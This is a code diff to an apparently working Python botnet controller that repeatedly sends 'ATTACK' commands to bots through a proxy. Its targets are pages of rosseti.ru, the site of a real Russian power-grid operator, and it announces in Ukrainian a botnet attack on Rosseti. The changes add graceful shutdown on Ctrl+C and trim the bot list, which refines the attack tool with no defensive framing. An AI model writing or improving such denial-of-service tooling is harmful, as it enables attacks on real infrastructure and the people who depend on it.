@@ -10,14 +10,16 @@ target_urls = [
     "https://rosseti.ru/about",
     "https://rosseti.ru/contact"
 ]
-bot_ips = ["192.168.1.14:5000", "bot2.local:5000"]  # Замініть на реальні IP:порт ботів
+bot_ips = ["192.168.1.14:5000"]  # Замініть на реальні IP:порт ботів
 proxies = {
     "http": "http://181.65.121.34:8080",
     "https": "https://181.65.121.34:8080"
 }
+running = True
 
 def send_command(bot_ip):
-    while True:
+    global running
+    while running:
         target = random.choice(target_urls)
         command = f"ATTACK {target}"
         try:
@@ -31,15 +33,24 @@ def send_command(bot_ip):
         time.sleep(1)
 
 def main():
-    print("Розпочинаю ботнет-атаку на Россети...")
+    print("Розпочинаю ботnet-атаку на Россети...")
     threads = []
     for bot_ip in bot_ips:
         t = threading.Thread(target=send_command, args=(bot_ip,))
         t.daemon = True
         threads.append(t)
         t.start()
-    for t in threads:
-        t.join()
+
+    try:
+        for t in threads:
+            t.join()
+    except KeyboardInterrupt:
+        print("Отримав Ctrl+C, завершую...")
+        global running
+        running = False
+        for t in threads:
+            t.join(timeout=2)
+        exit(0)
 
 if __name__ == "__main__":
     main()
